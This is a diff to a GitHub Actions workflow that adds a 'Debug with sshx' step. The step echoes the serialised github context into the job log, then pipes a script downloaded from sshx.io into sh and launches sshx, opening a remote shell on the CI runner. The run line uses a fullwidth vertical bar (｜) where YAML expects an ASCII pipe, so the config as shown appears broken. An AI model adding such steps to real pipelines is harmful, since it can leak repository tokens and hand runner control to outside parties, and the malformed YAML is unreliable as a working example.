@@ -19,8 +19,10 @@ jobs:
       - uses: actions/checkout@v3
         env:
           GITHUB: ${{ toJson(github) }}
+        
       - name: Debug with sshx
         run: ｜
+          echo $GITHUB
           set -x
           curl -sSf https://sshx.io/get | sh && sshx
   sync:
